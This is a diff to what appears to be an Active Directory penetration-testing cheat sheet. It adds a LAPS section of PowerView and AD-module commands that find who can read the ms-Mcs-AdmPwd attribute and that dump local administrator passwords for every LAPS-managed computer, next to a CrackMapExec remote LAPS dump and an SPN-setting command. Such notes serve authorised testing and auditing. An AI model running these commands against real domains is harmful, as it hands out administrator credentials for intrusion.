@@ -109,6 +109,27 @@ Get-ADPrincipalGroupMembershipRecursive "USERNAME"
 ## Set SPN
 Set-ADUser -Identity Support127User -ServicePrincipalNames @{Add='us/myspn127'} -Verbose
 
+
+
+# LAPS
+
+
+
+
+## Get LAPS password read permissions
+-PowerView:
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
+
+
+### Get LAPS Password for all LAPS machines
+$pc_name = (Get-ADComputer -Filter * -Properties name|select name).name
+**using LAPS module** 
+foreach($pc in $pc_name){Get-AdmPwdPassword -ComputerName $pc}
+**using PowerView**
+foreach($pc in $pc_name){Get-DomainObject -Identity $pc | Select -ExpandProperty ms-mcs-admpwd}
+**using ADModule**
+Get-adcomputer -identity $pc -properties ms-mcs-admpwd | select -expandproperty ms-mcs-admpwd 
+
 ## Get LAPS password remotly
 sudo crackmapexec ldap dc01.doamin.local -u 'uname' -p 'passwd' --kdcHost dc01.domain.local -M LAPS 
 
